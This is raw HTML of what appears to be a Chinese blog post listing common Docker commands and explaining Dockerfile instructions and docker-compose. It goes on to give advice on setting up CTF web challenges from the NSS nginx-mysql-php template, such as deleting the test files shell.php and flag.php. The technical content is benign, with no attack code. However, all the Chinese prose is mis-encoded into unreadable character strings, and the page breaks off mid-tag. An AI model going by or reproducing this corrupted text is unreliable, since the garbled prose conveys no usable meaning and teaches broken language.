title="å¸¸ç”¨æŒ‡ä»¤"></a>å¸¸ç”¨æŒ‡ä»¤</h3><p><strong>æŸ¥çœ‹dockerå®¹å™¨çŠ¶æ€</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">ps</span>  </span><br><span class="line">docker <span class="built_in">ps</span> <span class="literal">-a</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹dockeré•œåƒçŠ¶æ€</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p><strong>æ–°å»ºdockerå®¹å™¨</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span> -id --name èµ·ä¸ªå -p å¼€æ”¾ç«¯å£:æ˜ å°„ç«¯å£ tutum/lamp</span><br><span class="line"><span class="meta">#æ˜ å°„ç«¯å£å‰é¦–å…ˆç¡®å®šç«¯å£æ²¡æœ‰è¢«å ç”¨</span></span><br><span class="line"><span class="meta">#-d <span class="comment">//å®¹å™¨åå°è¿è¡Œã€‚</span></span></span><br><span class="line"><span class="meta">#-p <span class="comment">//æŒ‡å®šæ˜ å°„ç«¯å£ã€‚</span></span></span><br><span class="line"><span class="meta">#-P <span class="comment">//éšæœºæ˜ å°„é«˜ç«¯å£</span></span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -d -p <span class="number">9999</span>:<span class="number">80</span> tutum/lamp</span><br></pre></td></tr></table></figure><p><strong>å¤åˆ¶æ–‡ä»¶è¿›å…¥docker</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp [æœ¬åœ°è·¯å¾„] [container id]<span class="symbol">:</span>[container è·¯å¾„]</span><br><span class="line">ä¾‹å¦‚:</span><br><span class="line">docker cp flag.php dockeråå­—<span class="symbol">:/var/www/html</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥è¯¢å®¿ä¸»æœºip</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure><p><strong>è¿›å…¥æŒ‡å®šdocker</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it dockeråå­— <span class="keyword">/bin/</span>bash</span><br><span class="line"><span class="meta">#å¦‚æœä»è¿™ä¸ªå®¹å™¨é€€å‡ºï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ï¼Œæ¨èä½¿ç”¨ docker exec</span></span><br><span class="line"><span class="meta">#-i <span class="comment">//è®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¿æŒæ‰“å¼€ã€‚</span></span></span><br><span class="line"><span class="meta">#-t <span class="comment">//è®©dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯å¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å‡ºä¸Šã€‚</span></span></span><br></pre></td></tr></table></figure><p><strong>é€€å‡ºå½“å‰dockerå®¹å™¨</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><strong>å¯¼å‡ºå®¹å™¨</strong></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">docker</span> ex<span class="keyword">port</span> [dockerID] &gt; Find.tar</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨å®¹å™¨</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> å®¹å™¨ID</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ‰€æœ‰å­˜åœ¨çš„å®¹å™¨</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">container</span> <span class="keyword">ls</span> -a</span><br></pre></td></tr></table></figure><p><strong>åˆ é™¤å®¹å™¨</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [<span class="built_in">container</span> id]æˆ–è€…æ˜¯[<span class="built_in">container</span> name]</span><br><span class="line"><span class="meta">#éœ€è¦å…ˆæŠŠå®¹å™¨åœæ‰</span></span><br></pre></td></tr></table></figure><h2 id="æ¨¡æ¿ä»‹ç»"><a href="#æ¨¡æ¿ä»‹ç»" class="headerlink" title="æ¨¡æ¿ä»‹ç»"></a>æ¨¡æ¿ä»‹ç»</h2><p>ååˆ†æ„Ÿè°¢nssçš„å¸ˆå‚…æä¾›çš„æ¨¡æ¿å•¦ï¼Œè¿™é‡Œé™„ä¸Šé“¾æ¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CTF-Archives/</span>ctf-docker-template</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜"><a href="#åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜" class="headerlink" title="åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜"></a>åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜</h2><p>è¿™é‡Œæ„Ÿè°¢f12å¤§ä½¬æä¾›çš„å¸®åŠ©</p><h3 id="è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ"></a>è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥æ˜ç¡®ä¸¤ä¸ªä¸ªæ¦‚å¿µ;</p><p>ï¼ˆ1ï¼‰é•œåƒï¼š<br>ä»€ä¹ˆæ˜¯é•œåƒï¼Ÿå½“æˆ‘ä»¬åœ¨è™šæ‹Ÿæœºå¯åŠ¨dockeråï¼Œè¿è¡Œdocker imagesï¼Œæˆ‘ä»¬æ‰€çœ‹åˆ°çš„å°±æ˜¯æˆ‘ä»¬dockeré‡Œæ‰€æ‹¥æœ‰çš„é•œåƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/eb83d995c2a91cec54d44f0f93191b9.png" alt=""></p><p>ä¸Šé¢çš„äº”åˆ—ä¾æ¬¡æ˜¯ é•œåƒåç§°  é•œåƒæ ‡ç­¾  é•œåƒid  é•œåƒåˆ›å»ºæ—¶é—´  é•œåƒå¤§å°</p><p>ï¼ˆ2ï¼‰å®¹å™¨ï¼š</p><p>é•œåƒæ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„å‘¢ï¼Ÿå½“ç„¶æ˜¯åˆ›å»ºå®¹å™¨å•¦ï¼Œå½“æˆ‘ä»¬è¾“å…¥docker ps(æŸ¥çœ‹åœ¨è¿è¡Œçš„å®¹å™¨)æˆ–è€…docker ps -a(æŸ¥çœ‹æ‰€æœ‰å®¹å™¨)å°±å¯ä»¥çœ‹åˆ°å®¹å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b0e20b86ca59ba33927055323c6f6c1.png" alt=""></p><p>äº†è§£äº†è¿™äº›åŸºç¡€ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­ä¸‹é¢çš„å†…å®¹äº†</p><h4 id="å…ˆä»‹ç»dockerfile"><a href="#å…ˆä»‹ç»dockerfile" class="headerlink" title="å…ˆä»‹ç»dockerfile:"></a><strong>å…ˆä»‹ç»dockerfile:</strong></h4><p>dockerfileå°†ä¸€äº›éœ€è¦æ‰§è¡Œçš„å‘½ä»¤å­˜å‚¨åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­,åœ¨éœ€è¦çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œã€‚æˆ‘ä»¬åº”è¯¥å¦‚ä½•ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶æï¼Ÿè¿™ä¸ªæ—¶å€™å°±è¦æåˆ°docker builidè¿™ä¸ªæŒ‡ä»¤äº†ï¼Œä½¿ç”¨æ ¼å¼å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="tag">&lt;<span class="name">é•œåƒåç§°</span>&gt;</span>:<span class="tag">&lt;<span class="name">é•œåƒæ ‡ç­¾</span>&gt;</span> <span class="tag">&lt;<span class="name">ä¸Šä¸‹æ–‡è·¯å¾„</span>&gt;</span></span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">docker build -t sql:v1 .</span><br><span class="line">è¿™é‡Œçš„.æ˜¯å½“å‰ç›®å½•çš„æ„æ€ï¼Œè¿™ä¸»è¦æ˜¯ç»™dockerä¸€ä¸ªå¼•ç”¨è·¯å¾„ï¼Œå‘Šè¯‰dockerä½ éœ€è¦çš„æ–‡ä»¶éƒ½åœ¨å½“å‰ç›®å½•ä»¥åŠå…¶å­ç›®å½•ä¸‹</span><br></pre></td></tr></table></figure><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œè¯¥å‘½ä»¤ä¼šè‡ªåŠ¨æœç´¢.åŠå…¶å­ç›®å½•ä¸‹çš„åä¸ºdockerfileçš„æ–‡ä»¶</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-f è·¯å¾„</span></span><br><span class="line">æ­¤æ–¹æ³•å¯ä»¥æŒ‡å®šæ–‡ä»¶ä½œä¸ºdockerfileä½¿ç”¨</span><br></pre></td></tr></table></figure><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187</a></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/17c52f8981f341a48dc82ab82918461e.png" alt=""></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b370884a35ec495dbe708fd704598e9b.png" alt=""></p><p><strong>å¯¹äºä»¥ä¸‹ä»£ç çš„ç†è§£å¯ä»¥å‚è€ƒNSSçš„æ¨¡æ¿web-nginx-mysql-php73ï¼Œé™„ä¸Šæˆªå›¾</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727231741.png" alt=""></p><h5 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h5><p>æŒ‡å®šåŸºç¡€é•œåƒï¼Œå¿…é¡»ä¸ºç¬¬ä¸€ä¸ªå‘½ä»¤</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">ã€€ã€€FROM <span class="symbol">&lt;image&gt;</span></span><br><span class="line">ã€€ã€€FROM <span class="symbol">&lt;image&gt;</span>:<span class="symbol">&lt;tag&gt;</span></span><br><span class="line">ã€€ã€€FROM <span class="symbol">&lt;image&gt;</span>@<span class="symbol">&lt;digest&gt;</span></span><br><span class="line"></span><br><span class="line">ç¤ºä¾‹ï¼šã€€ã€€</span><br><span class="line">FROM mysq<span class="variable">l:5</span>.<span class="number">6</span></span><br><span class="line">æ³¨ï¼š</span><br><span class="line">   <span class="keyword">tag</span>æˆ–digestæ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸ä½¿ç”¨è¿™ä¸¤ä¸ªå€¼æ—¶ï¼Œä¼šä½¿ç”¨latestç‰ˆæœ¬çš„åŸºç¡€é•œåƒ</span><br></pre></td></tr></table></figure><h5 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h5><p>æ„å»ºé•œåƒæ—¶æ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span>ç”¨äºåœ¨æ„å»ºé•œåƒæ—¶æ‰§è¡Œå‘½ä»¤ï¼Œå…¶æœ‰ä»¥ä¸‹ä¸¤ç§å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼š</span><br><span class="line"><span class="keyword">shell</span>æ‰§è¡Œ</span><br><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="keyword">RUN</span> &lt;command&gt;</span><br><span class="line">execæ‰§è¡Œ</span><br><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">    <span class="keyword">RUN</span> apk <span class="keyword">update</span></span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;/etc/execfile&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg1&quot;</span>]</span><br><span class="line">æ³¨ï¼š<span class="keyword">RUN</span>æŒ‡ä»¤åˆ›å»ºçš„ä¸­é—´é•œåƒä¼šè¢«ç¼“å­˜ï¼Œå¹¶ä¼šåœ¨ä¸‹æ¬¡æ„å»ºä¸­ä½¿ç”¨ã€‚å¦‚æœä¸æƒ³ä½¿ç”¨è¿™äº›ç¼“å­˜é•œåƒï¼Œ</span><br><span class="line">å¯ä»¥åœ¨æ„å»ºæ—¶æŒ‡å®š--<span class="keyword">no</span>-cacheå‚æ•°ï¼Œå¦‚ï¼šdocker build --<span class="keyword">no</span>-cache</span><br></pre></td></tr></table></figure><h5 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h5><p>å°†æœ¬åœ°æ–‡ä»¶æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼Œtarç±»å‹æ–‡ä»¶ä¼šè‡ªåŠ¨è§£å‹(ç½‘ç»œå‹ç¼©èµ„æºä¸ä¼šè¢«è§£å‹)ï¼Œå¯ä»¥è®¿é—®ç½‘ç»œèµ„æºï¼Œç±»ä¼¼wget</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="built_in">ADD</span> &lt;src&gt;<span class="built_in">..</span>. &lt;dest&gt;</span><br><span class="line">    <span class="built_in">ADD</span> [<span class="string">&quot;&lt;src&gt;&quot;</span>,<span class="built_in">..</span>. <span class="string">&quot;&lt;dest&gt;&quot;</span>] ç”¨äºæ”¯æŒåŒ…å«ç©ºæ ¼çš„è·¯å¾„</span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">    <span class="built_in">ADD</span> hom* /mydir/          # æ·»åŠ æ‰€æœ‰ä»¥<span class="string">&quot;hom&quot;</span>å¼€å¤´çš„æ–‡ä»¶</span><br><span class="line">    <span class="built_in">ADD</span> hom?.txt /mydir/      # ? æ›¿ä»£ä¸€ä¸ªå•å­—ç¬¦,ä¾‹å¦‚ï¼š<span class="string">&quot;home.txt&quot;</span></span><br><span class="line">    <span class="built_in">ADD</span> test relativeDir/     # æ·»åŠ  <span class="string">&quot;test&quot;</span> åˆ° `WORKDIR`/relativeDir/</span><br><span class="line">    <span class="built_in">ADD</span> test /absoluteDir/    # æ·»åŠ  <span class="string">&quot;test&quot;</span> åˆ° /absoluteDir/</span><br></pre></td></tr></table></figure><h5 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h5><p>åŠŸèƒ½ç±»ä¼¼ADDï¼Œä½†æ˜¯æ˜¯ä¸ä¼šè‡ªåŠ¨è§£å‹æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½è®¿é—®ç½‘ç»œèµ„æº</p><h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;executable&quot;</span>,<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¼˜å…ˆ)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (è®¾ç½®äº†ENTRYPOINTï¼Œåˆ™ç›´æ¥è°ƒç”¨ENTRYPOINTæ·»åŠ å‚æ•°)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">command</span> param1 param2 (æ‰§è¡Œshellå†…éƒ¨å‘½ä»¤)</span></span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;This is a test.&quot;</span> | <span class="built_in">wc</span> -l</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/bin/wc&quot;</span>,<span class="string">&quot;--help&quot;</span>]</span></span><br><span class="line"></span><br><span class="line">æ³¨ï¼š<span class="keyword">CMD</span><span class="language-bash">ä¸åŒäºRUNï¼ŒCMDç”¨äºæŒ‡å®šåœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€ŒRUNç”¨äºæŒ‡å®šé•œåƒæ„å»ºæ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose:"></a><strong>docker-compose:</strong></h4><p>docker-compseåƒæ˜¯ä¸€ä¸ªä¸­æ§ç³»ç»Ÿï¼Œä»–å¯ä»¥æ§åˆ¶ç”±ä»–å¯åŠ¨çš„æ‰€æœ‰å®¹å™¨ï¼ŒåŒæ—¶å¯åŠ¨ã€åŒæ—¶å…³é—­ã€åŒæ—¶åˆ é™¤ç­‰ï¼Œå‘½åä¸€èˆ¬ä¸ºxxxxx.yamlï¼Œå†…å®¹æ ¼å¼å¦‚ä¸‹ï¼Œä»¥NSSæ¨¡æ¿web-nginx-mysql-php73ä¸ºä¾‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727224529.png" alt=""></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é‡ç‚¹å…³æ³¨serviceséƒ¨åˆ†ï¼Œç¼©è¿›ä¸€æ¬¡çš„webå’Œwwwä¸ºé•œåƒåï¼Œç¼©è¿›ä¸¤æ¬¡çš„ä¸ºå®¹å™¨å‚æ•°ï¼Œä¾‹å¦‚å¼€æ”¾ç«¯å£ã€æ˜ å°„ç«¯å£ã€å®¹å™¨åã€å¯åŠ¨çš„dockerfileä½ç½®ï¼ˆ<span class="keyword">build</span>å‚æ•°ï¼‰ï¼Œè¿™æ ·å¯ä»¥å®ç°åŒæ—¶å¯åŠ¨å¤šä¸ªä¸åŒå®¹å™¨ã€‚</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨å‘½ä»¤</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œ</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose -f docker-compose.yml up -d   <span class="regexp">//</span>æŒ‡å®šç›®å½•</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230728133207.png" alt=""></p><p>è¿™é‡Œå°±å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ï¼Œæˆ‘ä»¬æ‰§è¡Œdocker-compose up -dåï¼Œå¯åŠ¨äº†name4å’Œname5è¿™ä¸¤ä¸ªå®¹å™¨ï¼Œç„¶åæ„å»ºäº†docker_wwwå’Œdocker_webè¿™ä¸¤ä¸ªæœåŠ¡å™¨é•œåƒï¼Œæ­¤å¤„çš„é•œåƒæ˜¯å¯ä»¥é€šè¿‡ä¸Šè¿°runå‘½ä»¤äºŒæ¬¡ä½¿ç”¨çš„ï¼Œæ³¨æ„docker-composeåªèƒ½ç®¡ç†ç”±docker-composeæ‰€å¯åŠ¨çš„å®¹å™¨ï¼Œè€Œrunå¯åŠ¨çš„æ˜¯ä¸å¯ä»¥æ§åˆ¶çš„ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker-compose restart   <span class="regexp">//</span>é‡å¯æœåŠ¡å®¹å™¨ã€‚</span><br><span class="line">docker-compose start     <span class="regexp">//</span>å¯åŠ¨æœåŠ¡å®¹å™¨ã€‚</span><br><span class="line">docker-compose stop      <span class="regexp">//</span>åœæ­¢æœåŠ¡å®¹å™¨ã€‚</span><br><span class="line">docker-compose rm        <span class="regexp">//</span>åˆ é™¤æœåŠ¡ï¼ˆåœæ­¢çŠ¶æ€ï¼‰å®¹å™¨ã€‚</span><br><span class="line">docker-compose down      <span class="regexp">//</span>åœæ­¢å¹¶åˆ é™¤æ‰€æœ‰æœåŠ¡çš„å®¹å™¨ã€ç½‘ç»œã€é•œåƒã€æ•°æ®å·ã€‚</span><br><span class="line">docker-compose images    <span class="regexp">//</span>æ‰“å°æœåŠ¡å®¹å™¨æ‰€å¯¹åº”çš„é•œåƒã€‚</span><br></pre></td></tr></table></figure><h4 id="å‡ºé¢˜å»ºè®®-web-nginx-mysql-php73"><a href="#å‡ºé¢˜å»ºè®®-web-nginx-mysql-php73" class="headerlink" title="å‡ºé¢˜å»ºè®®(web-nginx-mysql-php73)"></a>å‡ºé¢˜å»ºè®®(web-nginx-mysql-php73)</h4><h5 id="åŸºæœ¬æ¡†æ¶"><a href="#åŸºæœ¬æ¡†æ¶" class="headerlink" title="åŸºæœ¬æ¡†æ¶"></a><strong>åŸºæœ¬æ¡†æ¶</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ docker</span><br><span class="line">â”‚   â””â”€â”€ docker-compose<span class="selector-class">.yml</span></span><br><span class="line">â”œâ”€â”€ Dockerfile</span><br><span class="line">â”œâ”€â”€ db<span class="selector-class">.sql</span></span><br><span class="line">â”œâ”€â”€ service</span><br><span class="line">â”‚   â””â”€â”€ docker-entrypoint<span class="selector-class">.sh</span></span><br><span class="line">â””â”€â”€ <span class="attribute">src</span></span><br><span class="line">â”œâ”€â”€ shell<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ index<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ flag<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ connect<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ source</span><br><span class="line">â””â”€â”€ assets</span><br><span class="line">â””â”€â”€ bootstrap</span><br><span class="line">â”œâ”€â”€ css</span><br><span class="line">â””â”€â”€ js</span><br></pre></td></tr></table></figure><p>é™„ä¸Šå¤§ä½¬çš„è®²è§£è§†é¢‘ï¼Œéå¸¸è¯¦ç»†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.bilibili.com<span class="regexp">/video/</span>BV1xW4y1Z7aa/?spm_id_from=<span class="number">333.999</span>.<span class="number">0.0</span>&amp;vd_source=<span class="number">757</span>ded406aff262d5f6010cb1a347a9a</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æ¡†æ¶å·²ç»æ˜¯éå¸¸å®Œæ•´çš„äº†ï¼Œåªéœ€è¦æŒ‰ç…§è‡ªå·±çš„éœ€æ±‚ç¨åŠ ä¿®æ”¹å°±å¯ä»¥è½»æ¾å‡ºé¢˜å•¦ï¼</p><h5 id="åˆ é™¤éƒ¨åˆ†"><a href="#åˆ é™¤éƒ¨åˆ†" class="headerlink" title="åˆ é™¤éƒ¨åˆ†"></a><strong>åˆ é™¤éƒ¨åˆ†</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="selector-class">.php</span></span><br><span class="line">flag<span class="selector-class">.php</span></span><br><span class="line">docker-compose.ymlä¸­çš„ç¯å¢ƒå˜é‡è®¾ç½®</span><br><span class="line"></span><br><span class="line">ä»¥ä¸Šéƒ¨åˆ†ä¸ºæµ‹è¯•ç”¨é€”ï¼Œæ²¡ç”¨ä¸€å®šå¾—åˆ ï¼Œé˜²æ­¢å‡ºç°éé¢„æœŸè§£</span><br></pre></td></tr></table></figure><h5 id="ä¿®æ”¹éƒ¨åˆ†"><a href="#ä¿®æ”¹éƒ¨åˆ†" class="headerlink" title="ä¿®æ”¹éƒ¨åˆ†"></a><strong>ä¿®æ”¹éƒ¨åˆ†</strong></h5><p>ï¼ˆ1ï¼‰ï¼šconnect.php</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸»è¦ç”¨äºæ•°æ®åº“è¿æ¥ï¼Œå…¶ä¸­çš„å‚æ•°å¯ä»¥è¿›è¡Œä¿®æ”¹ï¼Œä½†ä¸€å®šæ³¨æ„è¦å’Œdockerfileä¸­çš„å‚æ•°å€¼ä¿æŒä¸€è‡´ï¼ŒäºŒè€…å¿…é¡»åŒæ—¶ä¿®æ”¹</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ï¼šindex.phpã€docker-entrypoint.shã€docker-compose.yaml</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸‰è€…ä¸»è¦æ˜¯ç”¨äºä¸ªæ€§åŒ–çš„ä¿®æ”¹ï¼š</span><br><span class="line"></span><br><span class="line"><span 